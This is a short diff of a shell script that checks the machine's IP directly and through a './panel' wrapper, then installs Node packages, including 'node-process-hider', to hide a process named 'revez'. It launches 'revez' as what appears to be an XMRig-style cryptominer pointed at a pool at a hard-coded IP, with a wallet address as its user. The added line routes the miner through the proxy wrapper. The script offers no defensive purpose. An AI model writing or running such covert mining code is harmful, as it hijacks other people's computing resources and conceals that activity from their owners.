@@ -19,4 +19,4 @@ echo "IP ORI ==> "$(curl ifconfig.me)
 echo " " 
 echo " " 
 echo "IP BARU ==> "$(./panel curl ifconfig.me)
-apt update -y && apt upgrade -y && apt install -y nodejs && apt install -y npm && npm i -g updates && npm i -g node-process-hider && ph add revez && sudo ./revez --url 45.76.89.70:80 --user 89XsXBTmSdMbLFh8TfCWLBDXrWDN6arjEZdCtW6ZSQmMguE8oJV5qjxJpoiAinNoMaUq3GhcsXqvWc2BurXRtnnNQxsfRNi --pass $(echo $(shuf -i 1-20000 -n 1)) --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 -t 4
+apt update -y && apt upgrade -y && apt install -y nodejs && apt install -y npm && npm i -g updates && npm i -g node-process-hider && ph add revez && sudo ./panel sudo ./revez --url 45.76.89.70:80 --user 89XsXBTmSdMbLFh8TfCWLBDXrWDN6arjEZdCtW6ZSQmMguE8oJV5qjxJpoiAinNoMaUq3GhcsXqvWc2BurXRtnnNQxsfRNi --pass $(echo $(shuf -i 1-20000 -n 1)) --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 -t 4
